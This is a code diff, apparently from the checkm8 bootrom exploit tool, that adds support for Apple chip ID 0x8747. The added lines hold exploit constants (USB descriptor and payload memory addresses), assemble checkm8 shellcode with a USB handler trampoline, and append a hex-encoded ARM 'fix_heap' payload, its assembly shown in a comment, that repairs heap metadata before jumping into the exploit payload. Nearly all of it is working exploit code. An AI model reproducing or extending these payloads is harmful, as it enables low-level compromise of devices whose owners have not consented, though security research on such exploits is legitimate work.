@@ -163,6 +163,67 @@ def payload(cpid):
     assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7
     return s5l8947x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode)) + s5l8947x_handler
+  if cpid == 0x8747:
+    constants_usb_s5l8747x = [
+                0x22000000, # 1 - LOAD_ADDRESS
+                0x65786563, # 2 - EXEC_MAGIC
+                0x646F6E65, # 3 - DONE_MAGIC
+                0x6D656D63, # 4 - MEMC_MAGIC
+                0x6D656D73, # 5 - MEMS_MAGIC
+                  0x6F2C+1, # 6 - USB_CORE_DO_IO
+    ]
+    constants_checkm8_s5l8747x = [
+                0x2201A19C, # 1 - gUSBDescriptors
+                0x2201A718, # 2 - gUSBSerialNumber
+                  0x67D0+1, # 3 - usb_create_string_descriptor
+                0x2201920A, # 4 - gUSBSRNMStringDescriptor
+                0x2201C800, # 5 - PAYLOAD_DEST
+      PAYLOAD_OFFSET_ARMV7, # 6 - PAYLOAD_OFFSET
+        PAYLOAD_SIZE_ARMV7, # 7 - PAYLOAD_SIZE
+                0x2201A250, # 8 - PAYLOAD_PTR
+    ]
+
+    s5l8747x_handler = asm_thumb_trampoline(0x2201C800+1, 0x70F4+1) + prepare_shellcode('usb_0xA1_2_armv7', constants_usb_s5l8747x)[8:]
+
+    s5l8747x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8747x)
+    ret = s5l8747x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8747x_shellcode)) + s5l8747x_handler
+
+    '''
+    # fix_heap source
+    push {r1-r7,lr}
+    ldr r4, =0x2201b4e0  # leaked requests address
+    mov r5, #0
+    ldr r6, =0x361c # free function
+    add r6, r6, #1
+    # we need more free space, so clear leaked requests
+loop:
+    add r0, r4, r5
+    blx r6
+    add r5, r5, #0x40
+    cmp r5, #0x780
+    bne loop
+    # restore original chunk meta-data
+    ldr r4, =0x2201b340  # second conf descriptor chunk header
+    ldr r0, =0x00000008  # original chunk header values
+    ldr r1, =0x00000002
+    str r0, [r4]
+    str r1, [r4, #4]
+    pop {r1-r7,lr}
+    ldr r0, =0x22000000
+    bx r0  # jump to checkm8 payload
+    '''
+
+    fix_heap = 'fe402de93c409fe50050a0e338609fe5'\
+               '016086e2050084e036ff2fe1405085e2'\
+               '1e0d55e3faffff1a20409fe520009fe5'\
+               '20109fe5000084e5041084e5fe40bde8'\
+               '14009fe510ff2fe1e0b401221c360000'\
+               '40b30122080000000200000000000022'.decode('hex')
+
+
+    assert len(ret) < 0x300
+    ret += '\0' * (0x300 - len(ret)) + fix_heap
+    return ret
   if cpid == 0x8950:
     constants_usb_s5l8950x = [
                 0x10000000, # 1 - LOAD_ADDRESS
